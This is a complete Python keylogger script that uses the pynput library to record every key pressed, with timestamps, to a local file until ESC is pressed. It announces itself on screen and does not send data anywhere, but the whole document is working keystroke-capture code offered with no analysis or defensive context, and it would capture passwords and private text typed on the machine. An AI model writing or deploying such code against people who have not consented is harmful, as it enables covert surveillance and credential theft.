from pynput.keyboard import Key, Listener
import logging

# Setup logging configuration
log_file = "keylogs.txt"
logging.basicConfig(
    filename=log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s'
)

print("Keylogger is running... (Press ESC to stop)")

# Function to handle key press
def on_press(key):
    if key == Key.esc:
        print(" Keylogger stopped.")
        return False

    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special Key pressed: {key}")

# Start listening to keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
